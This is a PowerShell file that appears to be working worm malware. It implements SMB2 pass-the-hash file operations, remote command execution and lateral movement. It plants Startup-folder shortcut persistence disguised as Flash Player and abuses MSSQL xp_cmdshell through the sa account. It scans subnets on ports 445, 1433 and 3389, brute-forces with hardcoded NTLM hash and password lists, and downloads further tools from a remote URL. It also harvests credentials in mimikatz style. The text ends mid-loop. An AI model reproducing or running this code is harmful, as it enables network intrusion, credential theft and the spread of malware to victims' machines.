                        $packet_SMB2_data = New-PacketSMB2SetInfoRequest $set_info_request_file_info_class $set_info_request_info_level $file_ID $set_info_request_buffer
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($source_file_size -le 65536)
                        {
                            $write_request_length = $source_file_size
                        }
                        else
                        {
                            $write_request_length = 65536
                        }

                        $write_request_offset = 0
                        $write_request_step = 1

                        if($Action -eq 'Delete')
                        {
                            $output_message = "[+] File deleted"
                            $stage = 'CloseRequest'
                            $action_step++
                        }
                        elseif($Action -eq 'Put' -and $action_step -eq 4)
                        {
                            $output_message = "[+] File uploaded"
                            $stage = 'CloseRequest'
                        }
                        else
                        {
                            $stage = 'WriteRequest'
                        }

                    }

                    'TreeConnect'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x1f,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $path_bytes
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        try
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        }
                        catch
                        {
                            Write-Output "[-] Session connection is closed"
                            $stage = 'Exit'
                        }
                        
                        if($stage -ne 'Exit')
                        {

                            if([System.BitConverter]::ToString($client_receive[12..15]) -ne '00-00-00-00')
                            {
                                $error_code = [System.BitConverter]::ToString($client_receive[12..15])

                                switch($error_code)
                                {

                                    'cc-00-00-c0'
                                    {
                                        $output_message = "[-] Share not found"
                                        $stage = 'Exit'
                                    }

                                    '22-00-00-c0'
                                    {
                                        $output_message = "[-] Access denied"
                                        $stage = 'Exit'
                                    }

                                    default
                                    {
                                        $error_code = $error_code -replace "-",""
                                        $output_message = "[-] Tree connect error code 0x$error_code"
                                        $stage = 'Exit'
                                    }

                                }

                            }
                            elseif($refresh)
                            {
                                Write-Output "[+] Session refreshed"
                                $stage = 'Exit'
                            }
                            elseif(!$SMB_IPC)
                            {
                                $SMB_share_path = "\\" + $Target + "\" + $Share
                                $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_share_path)
                                $SMB_IPC = $true
                                $stage = 'IoctlRequest'
                                $file = ""
                            }
                            else
                            {

                                if($Action -eq 'Put')
                                {
                                    $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                                    $create_request_extra_info = 2
                                }
                                else
                                {
                                    $create_request_extra_info = 1
                                }

                                $tree_ID = $client_receive[40..43]
                                $stage = 'CreateRequest'

                                if($Action -eq 'Get')
                                {
                                    $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                                }

                            }

                        }

                    }

                    'TreeDisconnect'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($inveigh_session -and !$Logoff)
                        {
                            $stage = 'Exit'
                        }
                        else
                        {
                            $stage = 'Logoff'
                        }

                    }
                        
                    'WriteRequest'
                    {

                        if(!$Modify)
                        {
                            $source_file_binary_reader.BaseStream.Seek($write_request_offset,"Begin") > $null
                            $source_file_binary_reader.Read($source_file_buffer,0,$source_file_buffer_size) > $null
                        }
                        else
                        {
                            $source_file_buffer = $Source[$write_request_offset..($write_request_offset+$write_request_length)]
                        }
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_header["CreditCharge"] = 0x01,0x00
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $write_request_length $write_request_offset $file_ID $source_file_buffer
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($write_request_step -lt $source_file_size_quotient)
                        {

                            if(!$NoProgress)
                            {
                                $percent_complete_calculation = [Math]::Truncate($write_request_step / $percent_complete * 100)
                                Write-Progress -Activity "[*] Uploading $source_file - $progress_file_size" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation
                            }

                            $write_request_offset+=65536
                            $write_request_step++
                            $stage = 'WriteRequest'
                        }
                        elseif($write_request_step -eq $source_file_size_quotient -and $source_file_size_remainder -ne 0)
                        {
                            $write_request_length = $source_file_size_remainder
                            $write_request_offset+=65536
                            $write_request_step++
                            $stage = 'WriteRequest'
                        }
                        else
                        {
                            $action_step++
                            $set_info_request_file_info_class = 0x01
                            $set_info_request_info_level = 0x04
                            $set_info_request_buffer = $source_file_creation_time +
                                                        $source_file_last_access_time +
                                                        $source_file_last_write_time +
                                                        $source_file_last_change_time + 
                                                        0x00,0x00,0x00,0x00,
                                                        0x00,0x00,0x00,0x00

                            if(!$Modify)
                            {
                                $stage = 'SetInfoRequest'
                            }
                            else
                            {
                                $output_message = "[+] File uploaded from memory"
                                $stage = 'CloseRequest'
                            }

                        }

                    }
                    
                }
            
            }

        }

    }
    catch
    {
        Write-Output "[-] $($_.Exception.Message)"
    }
    finally
    {  

        if($file_write.Handle)
        {
            $file_write.Close()
        }

        if($source_file_stream.Handle)
        {
            $source_file_binary_reader.Close()
            $source_file_stream.Close()
        }

        if($inveigh_session -and $Inveigh)
        {
            $inveigh.session_lock_table[$session] = 'open'
            $inveigh.session_message_ID_table[$session] = $message_ID
            $inveigh.session[$session] | Where-Object {$_."Last Activity" = Get-Date -format s}
        }

        if(!$inveigh_session -or $Logoff)
        {
            $client.Close()
            $client_stream.Close()
        }

    }

}

    if(!$Modify -or $Action -eq 'Put')
    {
        Write-Output $output_message
    }
    elseif($output_message)
    {
        Write-Verbose $output_message
    }

}

function copyrun {   
	Param(
    [parameter(Mandatory=$true)][String]$ip,
	[parameter(Mandatory=$true)][String]$thedomain,
    [parameter(Mandatory=$true)][String]$user,
	[parameter(Mandatory=$true)][String]$cmd
	)
	if($thedomain -eq 'localhost'){
		$ipchash = $allhash
	}else{
		$ipchash = $gethashs
	}
	for($i = 0; $i -lt $ipchash.Count; $i++){
		$script:tmpip = $ip
		$script:tmpuser = $user
		$script:tmphash = ""
		$script:sign = ""
		try{
			[string]$list_rst = Invoke-SMBC -Domain $thedomain -Username $user -Hash $ipchash[$i] -Action List -Source \\$ip\users -verbose
			#write-host $list_rst
			if($list_rst.IndexOf("failed to authenticate") -eq '-1'){ 
				try{    
					write-host $ipchash[$i]
					[string]$exec_rst = Invoke-SE -Target $ip -Domain $thedomain -Username $user -Hash $ipchash[$i] -Command $cmd
				}catch{}
				if($exec_rst.IndexOf("Command executed") -ne '-1'){  
					return    
				}
				
				$ipchash[$i]
				$list_rst += Invoke-SMBC -Domain $thedomain -Username $user -Hash $ipchash[$i] -Action "List" -Source \\$ip\c$\users -verbose
				$list_rst += Invoke-SMBC -Domain $thedomain -Username $user -Hash $ipchash[$i] -Action "List" -Source \\$ip\c\users -verbose
				$list_rst
				$list_arry = $list_rst.Split("`n")
				for ($j=0; $j -lt $list_arry.Count; $j++ ){   
					[String]$temp_past = $list_arry[$j].Split('[')[0]
					if($temp_past -match "^d-"){
					$pos = $temp_past.IndexOf('\')
					[string[]]$path_arry += ($temp_past.Substring($pos))
					}
				}
				for ($k=0; $k -lt $path_arry.Count; $k++ ){
					$path_arry[$k]
					$script:sign = ""
					$sign_path = $path_arry[$k].trim()+'\AppData\Roaming\sign.txt'   
					$core_path = $path_arry[$k].trim()+'\AppData\Roaming\flashplayer.tmp'   
					$old_path = $path_arry[$k].trim()+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat'  
					$link_path = $path_arry[$k].trim()+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\FlashPlayer.lnk'  
					Invoke-SMBC -Domain $domain -Username $user -Hash $ipchash[$i] -Action Put -Source $byte_sign -Destination "$sign_path" -Modify
					Invoke-SMBC -Domain $domain -Username $user -Hash $ipchash[$i] -Action Delete -Source "$old_path"
					if($script:sign -eq ''){
						$core_path
						Invoke-SMBC -Domain $domain -Username $user -Hash $ipchash[$i] -Action Delete -Source "$core_path"
						Invoke-SMBC -Domain $domain -Username $user -Hash $ipchash[$i] -Action Put -Source $byte_core -Destination "$core_path" -Modify
						$link_path
						Invoke-SMBC -Domain $domain -Username $user -Hash $ipchash[$i] -Action Delete -Source "$link_path"
						Invoke-SMBC -Domain $domain -Username $user -Hash $ipchash[$i] -Action Put -Source $byte_link -Destination "$link_path" -Modify
					}else{
					"Bypass"
					}
				}
				break
			}
		}catch{}
	}
}

$localIf=$flase;New-Object System.Threading.Mutex($true,'Global\LocalIf',[ref]$localIf)

function db_query{
	Param(
    [parameter(Mandatory=$true)][System.Data.SqlClient.SqlConnection]$sqlconnection,
	[parameter(Mandatory=$true)][String]$sqlcommand
	)
	$SqlCmd = New-Object System.Data.SqlClient.SqlCommand
	$SqlCmd.CommandText = $sqlcommand
	$SqlCmd.Connection = $SqlConnection 
	$SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter
	$SqlAdapter.SelectCommand = $SqlCmd 
	$DataSet = New-Object System.Data.DataSet
	$SqlAdapter.Fill($DataSet) 
	$DataSet.Tables[0] | Format-Table -Auto 
}
function mssqlrun {
	Param(
    [parameter(Mandatory=$true)][String]$ip,
	[parameter(Mandatory=$true)][String]$pass,
	[parameter(Mandatory=$true)][String]$cmd
	)
	$SqlConnection = New-Object System.Data.SqlClient.SqlConnection
	$SqlConnection.ConnectionString = "Server = $ip; Database = master ; User ID= sa; Password= $pass" 
	try{
		$sqlconnection.open()
	}catch{
		return $false
	}	
	try{db_query -sqlconnection $sqlconnection -sqlcommand "exec sp_dropextendedproc 'xp_cmdshell';"}catch{}
	try{db_query -sqlconnection $sqlconnection -sqlcommand "dbcc addextendedproc('xp_cmdshell','xplog70.dll')"}catch{}
	try{db_query -sqlconnection $sqlconnection -sqlcommand "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE;"}catch{}
	try{
		db_query -sqlconnection $sqlconnection -sqlcommand "xp_cmdshell '$cmd'"
		write-host "Get sa pass:$pass"
	}catch{}
	$SqlConnection.Close() 
	return $true
}

function getipaddrs{
	write-host "Get ipaddress..."
	$global:ipaddrs_i = @()
	$global:ipaddrs_o = @()
	$allip = @()
	[string[]]$ipsub = @('192.168.0','192.168.1','192.168.2','192.168.3','192.168.4','192.168.5','192.168.6','192.168.7','192.168.8','192.168.9','192.168.10','192.168.18','192.168.31','192.168.199','192.168.254','192.168.67','10.0.0','10.0.1','10.0.2','10.1.1','10.90.90
','10.1.10','10.10.1')
	[string[]]$ipsub_o = @()
	$regex = [regex]"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"

	$regex.Matches((ipconfig /all)) | ForEach-Object { 
		if ($allip -notcontains $_.Value)
		{ $allip += $_.Value }
	}
	$regex.Matches((ipconfig /displaydns)) | ForEach-Object { 
		if ($allip -notcontains $_.Value)
		{ $allip += $_.Value }
	}
	$regex.Matches((netstat -ano)) | ForEach-Object { 
		if ($allip -notcontains $_.Value)
		{ $allip += $_.Value }
	}

	foreach($IP in $allip)
	{
		if ($IP.StartsWith("127.") -or ($IP -match '25\d.*') -or ($IP -match '24\d.*') -or $IP.StartsWith("0.") -or $IP.StartsWith("169.254") -or $IP -eq '1.0.0.127')
		{
		}else{
			$iptemp = $ip.Split(".")
			$SubnetIP = $iptemp[0] + "." +  $iptemp[1] + "." +  $iptemp[2]
			if ($ipsub -notcontains $SubnetIP)
			{ $ipsub = @($SubnetIP) + $ipsub}
		}
	}
	
	try{
		$NetObject = New-Object Net.WebClient
		$wlanip = $NetObject.DownloadString("https://api.ipify.org/")   
		$wlaniptemp = $wlanip.Split(".")
		$wlansub = $wlaniptemp[0] + "." +  $wlaniptemp[1] + "." +  $wlaniptemp[2]
		if($ipsub -notcontains $wlansub)
		{ $ipsub_o = $wlansub }            
	}catch{}
	
	try{
		$ipaddress = [System.Net.DNS]::GetHostByName($null).AddressList     
		$localip = @()
		Foreach ($ip in $ipaddress)
		{
			$localip += $ip.IPAddressToString
			$intiptemp = $ip.IPAddressToString.Split(".")
			if($intiptemp[0] -ne '127'){
				$intipsub = $intiptemp[0] + "." +  $intiptemp[1] + "." +  $intiptemp[2]
				if($ipsub -notcontains $intipsub)
				{ $ipsub += $intipsub }
			}
		}
	}catch{}
	
	$ran_ipsub_b = ""+(1+(Get-Random -Maximum 254))+"."+(1+(Get-Random -Maximum 254))
	$global:ipaddrs_b = $ran_ipsub_b
	for($i=0; $i -lt 256; $i++){
		try{
			$ran_ipsub = $ran_ipsub_b+"."+$i
			if($ipsub -notcontains $ran_ipsub){
				$ipsub_o += $ran_ipsub
			}
		}catch{}
	}
	write-host "inter count:"($ipsub.count)
	write-host "outer count:"($ipsub_o.count)
	foreach($ipsub2 in $ipsub)
	{	
		$global:ipaddrs_i += 1..254|%{$ipsub2+"."+$_}
	}
	foreach($ipsub3 in $ipsub_o)
	{	
		$global:ipaddrs_o += 1..254|%{$ipsub3+"."+$_}
	}
	$global:ipaddrs_i = @($global:ipaddrs_i | Where-Object { $localip -notcontains $_ })
	write-host "Get address done!!"
}

function localscan { 
	Param(
	[int]$Port = 445,
	[int]$Flag = 0
	)
	write-host "scan port $port..."
	[string[]]$openips = @()
	$clients = @{}
	$connects = @{}
	if($Flag){
		$ipaddrs = $ipaddrs_o
	} else {
		$ipaddrs = $ipaddrs_i
	}
	$batch_count=256
	$count=0
	foreach($ip in $ipaddrs) {
		try{
			$client = New-Object System.Net.Sockets.TcpClient
			$connect = $client.BeginConnect($ip,$port,$null,$null)
			$connects[$ip] = $connect
			$clients[$ip] = $client
		}
		catch{
			Write-host $Error[0]
		}
		$count++
		if(($count%$batch_count -eq 0) -or ($count -eq $ipaddrs.count)){
			write-host "pause..."
			Start-Sleep -Milli 3000
			foreach($ip1 in $clients.Keys) {
				if ($clients[$ip1].Connected) {
					$clients[$ip1].EndConnect($connects[$ip1])
					$openips += $ip1
				}
				$clients[$ip1].Close()
			}
			$clients = @{}
			$connects = @{}
		}
	}
	"total scan ip count:"+$count
	write-host $openips
	return ,$openips
}

[string[]]$global:alluser = @("administrator","admin")
[string[]]$global:allhash = @("31d6cfe0d16ae931b73c59d7e0c089c0","32ed87bdb5fdc5e9cba88547376818d4","8846f7eaee8fb117ad06bdd830b7586c","7b592e4f8178b4c75788531b2e747687","afffeba176210fad4628f0524bfe1942","579da618cfbfa85247acf1f800a280a4","47bf8039a8506cd67c524a03ff
84ba4e","5ae7b89b3afea28d448ed31b5c704289","3f9f5f112da330ac4c20be279c6addfa","73f5d97549f033374fa6d9f9ce247ffd","6f12c0ab327e099821bd938f39faab0d","e5ae562ddfaa6b446c32764ab1ebf3ed","161cff084477fe596a5db81874498a24","d30c2ef8389ac9e8516baacb29463b7b","bc007082d3277
7855e253fd4defe70ee","e45a314c664d40a227f9540121d1a29d","d144986c6122b1b1654ba39932465528","f4bb18c1165a89248f9e853b269a8995","570a9a65db8fba761c1008a51d4c95ab","e1a692bd23bde99b327756e59308b4f8","a87f3a337d73085c45f9416be5787d86","00affd88fa323b00d4560bf9fef0ec2f","
31fc0dc8f7dfad0e8bd7ccc3842f2ce9","674e48b68c5cd0efd8f7e5faa87b3d1e","69943c5e63b4d2c104dbbcc15138b72b","588feb889288fb953b5f094d47d1565c","bcdf115fd9ba99336c31e176ee34b304","3dbde697d71690a769204beb12283678","df54de3f3438343202c1dd523d0265be","7ce21f17c0aee7fb9ceba5
32d0546ad6","7a21990fcd3d759941e45c490f143d5f","579110c49145015c47ecd267657d3174","af27efb60c7b238910efe2a7e0676a39","2d7f1a5a61d3a96fb5159b5eef17adc6","4057b60b514c5402dde3d29a1845c366","e8cd0e4a9e89eab931dc5338fcbec54a","6920c58d0df184d829189c44fafb7ece","3fa45a060
bd2693ae4c05b601d05ca0c","ba07ba35933e5bf42dea4af8add09d1e","f1351ac828428d74f6da2968089fc91f","e84d037613721532e6b6d84d215854b6","2f2d544c53b3031f24d63402ea7fb4f9","328727b81ca05805a68ef26acb252039","259745cb123a52aa2e693aaacca2db52","c22b315c040ae6e0efee3518d830362
b","162e829be112225fedf856e38e1c65fe","209c6174da490caeb422f3fa5a7ae634","f9e37e83b83c47a93c2f09f66408631b","b3ec3e03e2a202cbd54fd104b8504fef","4ed91524cb54eaacc17a185646fb7491","aa647b916a1fad374df9c30711d58a7a","a80c9cc3f8439ada25af064a874efe2d","13b29964cc2480b4ef
454c59562e675c","de26cce0356891a4a020e7c4957afc72","e19ccf75ee54e06b06a5907af13cef42","30fcaa8ad9a496b3e17f7fbfacc72993","41630abb825ca50da31ce1fac1e9f54d","f56a8399599f1be040128b1dd9623c29","2e4dbf83aa056289935daea328977b20","b963c57010f218edc2cc3c229b5e4d0f","f2477
a144dff4f216ab81f2ac3e3207d","e6bd4cdb1e447131b60418f31d0b81d6","b9f917853e3dbf6e6831ecce60725930","6d3986e540a63647454a50e26477ef94","066ddfd4ef0e9cd7c256fe77191ef43c","152efbcfafeb22eabda8fc5e68697a41","5835048ce94ad0564e29a924a03510ef","2d20d252a479f485cdf5e171d93
985bf","320a78179516c385e35a93ffa0b1c4ac","0d757ad173d2fc249ce19364fd64c8ec","72f5cfa80f07819ccbcfb72feb9eb9b7","f67f5e3f66efd7298be6acd32eeeb27c","1c4ecc8938fb93812779077127e97662","ad70819c5bc807280974d80f45982011","a836ef24f0a529688be2af1479a95411","36aa83bdcab3c9
fdaf321ca42a31c3fc","acb98fd0478427cd18949050c5e87b47","85deeec2d12f917783b689ae94990716","a4141712f19e9dd5adf16919bb38a95c","e7380ae8ef85ae55bdceaa59e418bd06","81e5f1adc94dd08b1a072f9c1ae3dd3f","71c5391067de41fad6f3063162e5eeff")
[string[]]$global:WmicUSER = @("administrator")  
[string[]]$global:allpass = @("saadmin","123456","password","PASSWORD","123.com","admin@123","Aa123456","qwer12345","Huawei@123","123@abc","golden","123!@#qwe","1qaz@WSX","Ab123","1qaz!QAZ","Admin123","Administrator","Abc123","Admin@123","999999","Passw0rd","123qwe!@
#","football","welcome","1","12","21","123","321","1234","12345","123123","123321","111111","654321","666666","121212","000000","222222","888888","1111","555555","1234567","12345678","123456789","987654321","admin","abc123","abcd1234","abcd@1234","abc@123","p@ssword"
,"P@ssword","p@ssw0rd","P@ssw0rd","P@SSWORD","P@SSW0RD","P@w0rd","P@word","iloveyou","monkey","login","passw0rd","master","hello","qazwsx","password1","qwerty","baseball","qwertyuiop","superman","1qaz2wsx","fuckyou","123qwe","zxcvbn","pass","aaaaaa","love","administr
ator","qwe1234A","qwe1234a"," ","123123123","1234567890","88888888","111111111","112233","a123456","123456a","5201314","1q2w3e4r","qwe123","a123456789","123456789a","dragon","sunshine","princess","!@#$%^&*","charlie","aa123456","homelesspa","1q2w3e4r5t","sa","sasa","
sa123","sql2005","sa2008","abc","abcdefg","sapassword","Aa12345678","ABCabc123","sqlpassword","sql2008","11223344","admin888","qwe1234","A123456")

$base_link = "TAAAAAEUAgAAAAAAwAAAAAAAAEbpAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAADUBFAAfUOBP0CDqOmkQotgIACswMJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAUgAxAAAAAAAAAAAAEABXaW5kb3dzADwACAAEAO++AAAAAAAAAAAqAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFcAa
QBuAGQAbwB3AHMAAAAWAFYAMQAAAAAAAAAAABAAc3lzdGVtMzIAAD4ACAAEAO++AAAAAAAAAAAqAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHMAeQBzAHQAZQBtADMAMgAAABgAXgAyAAAAAAAAAAAAAAB3c2NyaXB0LmV4ZQBEAAgABADvvgAAAAAAAAAAKgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB3AHMAYwByAGkAcAB0AC4AZQB4AGUAAAAaAAAAJQAu
AC4AXAAuAC4AXAAuAC4AXABXAGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAdwBzAGMAcgBpAHAAdAAuAGUAeABlACoALwAvAGUAOgBqAGEAdgBhAHMAYwByAGkAcAB0ACAAIgAlAGEAcABwAGQAYQB0AGEAJQBcAGYAbABhAHMAaABwAGwAYQB5AGUAcgAuAHQAbQBwACIACwByAHUAbgBvAG4AYwBlAC4AZQB4AGUAEAAAAAUAAKAlAAAA1QAAABw
AAAALAACgd07BGucCXU63RC6xrlGYt9UAAACZAAAACQAAoI0AAAAxU1BT4opYRrxMOEO7/BOTJphtznEAAAAEAAAAAB8AAAAvAAAAUwAtADEALQA1AC0AMgAxAC0AMQAzADMANAA4ADgANwAwADMAMwAtADIAMQAyADkAMQAwADQAOAAzADIALQAyADkAOQAxADAANAA4ADAAOAA5AC0AMQAwADAAMAAAAAAAAAAAAAAAAAAAAAAA"

$base_usb_lnk = "TAAAAAEUAgAAAAAAwAAAAAAAAEaBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKQAFAAfgCAg7CHqOmkQot0IACswMJ2OAAAAAAAAAAAAAAAAagAAAAAAABEADQBKADoAXABiAGwAdQBlAGIAbAB1AGUANgAuAGIAaQBuAAAARgBsAGEAcwBoACAAUABsAGEAeQBlAHIAAABNAGEAbg
BhAGcAZQAgAEYAbABhAHMAaAAgAFAAbABhAHkAZQByACAAUwBlAHQAdABpAG4AZwBzAAAAAAAQAAAABQAAoAMAAAAUAAAAAAAAAA=="

$base_sign = "MA=="
$byte_link = [Convert]::FromBase64String($base_link)
$byte_core = [Convert]::FromBase64String($base_core)
$byte_sign = [Convert]::FromBase64String($base_sign)

[string[]]$global:ipaddrs_i = @()
[string[]]$global:ipaddrs_o = @()
$global:ipaddrs_b=""
$global:retry = 0
$global:getusers = @()
$global:getpasswd = @()
$global:getdomain = @()
$global:gethashs = @()

$exepath = $env:tmp+"\wfreerdp.exe"
$downpath=$env:tmp+"\wf.cab"
$d_retry=3 
while(!(Test-Path $exepath) -or !(Test-Path $env:tmp\mimi.dat)){
	if($d_retry -eq 0){break}
	(new-object System.Net.WebClient).DownloadFile($log_url+"/wf.cab",$downpath)
	if(test-path $downpath) {
		cmd /c expand $downpath -f:* $env:tmp
	}
	$d_retry--
	start-sleep 3
}

try{  
	write-host "init...."
	$temp = (Get-WmiObject -Class Win32_UserAccount)
	foreach ($t in $temp) {
		$pattern="(\d{4}$)"
		if(($t.SID -match $pattern) -and ($alluser -notcontains $t.Name)){   
			$alluser += $t.Name
		}
	}
	if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){
		$hasharray = geth  
		foreach($hashline in $hasharray){
			$hash = $hashline.split(":")
			$un = $hash[0]
			$hs = $hash[3]

			if($hash[1] -eq '500' -or $hash[1].length -eq 4){
				if ($alluser -notcontains $un){
				$alluser += "$un"
				}
				if ($allhash -notcontains $hs){
				$allhash += "$hs"
				}
			}
		}

		$getpass = (Invoke-Mypass).Replace(" ", "")  
		$mm=[regex]::matches($getpass,'\*Username:.+');  
		$pp=[regex]::matches($getpass,'\*Password:.+');
		$nn=[regex]::matches($getpass,'\*NTLM:.+');
		$dd=[regex]::matches($getpass,'\*Domain:.+');
		foreach($uuu in $mm){
			$uuu=$uuu.value.trim().Replace('*Username:', "");
			if (($uuu -ne "(null)") -and ($uuu.IndexOf("`$") -eq -1) -and ($getusers -notcontains $uuu)){
			$getusers += "$uuu"
			}
			if (($uuu -ne "(null)") -and ($uuu.IndexOf("`$") -eq -1) -and ($alluser -notcontains $uuu)){
			$alluser += "$uuu"
			}
		}
		foreach($ppp in $pp){
			$ppp=$ppp.value.trim().Replace('*Password:', "");
			if (($ppp -ne "(null)") -and ($getpasswd -notcontains $ppp) -and ($ppp.length -lt 20)){
			$getpasswd += "$ppp"
			}
			if (($ppp -ne "(null)") -and ($allpass -notcontains $ppp) -and ($ppp.length -lt 20)){
			$allpass += "$ppp"
			}
		}
		foreach($hhh in $nn){
			$hhh=$hhh.value.trim().Replace('*NTLM:', "");
			if (($hhh -ne '31d6cfe0d16ae931b73c59d7e0c089c0') -and ($gethashs -notcontains $hhh)){
			$gethashs += "$hhh"
			}
			if ($allhash -notcontains $hhh){
			$allhash += "$hhh"
			}
		}
		foreach($ddd in $dd){
			$ddd=$ddd.value.trim().Replace('*Domain:', "");
			if (($getdomain -notcontains $ddd) -and ($ddd.IndexOf("`$") -eq -1) -and ($ddd -ne "(null)") -and ($ddd -ne "workgroup") -and ($ddd -ne "$env:COMPUTERNAME")){
			$getdomain += "$ddd"
			}
		}
	}
}catch{}


$inter_flag=$false
$start_time=Get-Date -UFormat "%s"
	
while($true)
{
	if(((Get-Date -UFormat "%s")-$start_time) -gt 86400*2) {break}
	$portopen = @()
	$ms_portopen = @()
	$old_portopen = @()
	$rdp_portopen = @()
	getipaddrs
	for($t=0;$t -lt 2;$t++) {
		if($inter_flag) {$t=1}
		else {
			$inter_flag=$true
		}
		$portopen = localscan -port 445 -flag $t
		$ms_portopen = localscan -port 1433 -flag $t
		$old_portopen = localscan -port 65529 -flag $t
		$rdp_portopen = localscan -port 3389 -flag $t
		if($t -eq 0){
			$sc_code = $sc
			$mscmd_code = $mssql_cmd
			$ipc_code = $ipc_cmd
			$rdp_code = $rdp_cmd
		} else {
			$sc_code = $sco
			$mscmd_code = $mssqlo_cmd
			$ipc_code = $ipco_cmd
			$rdp_code = $rdpo_cmd
		}
		
		foreach($currip in $portopen[1])
		{
			if (($old_portopen -notcontains $currip) -and ($currip.length -gt 6)){
				
				write-host "start ipc scanning...."
				for($n = 0; $n -lt $alluser.Count; $n++){
					write-host $alluser[$n] 
					copyrun -ip $currip -thedomain "localhost" -user $alluser[$n] -cmd $ipc_code
				}
				for($nn = 0; $nn -lt $getdomain.Count; $nn++){
					if($getdomain[$nn] -ne '.'){
						for($uu = 0; $uu -lt $getusers.Count; $uu++){
							copyrun -ip $currip -thedomain $getdomain[$nn] -user $getusers[$uu] -cmd $ipc_code
						}
					}
				}
				
				try{
					write-host "start eb scanning..."
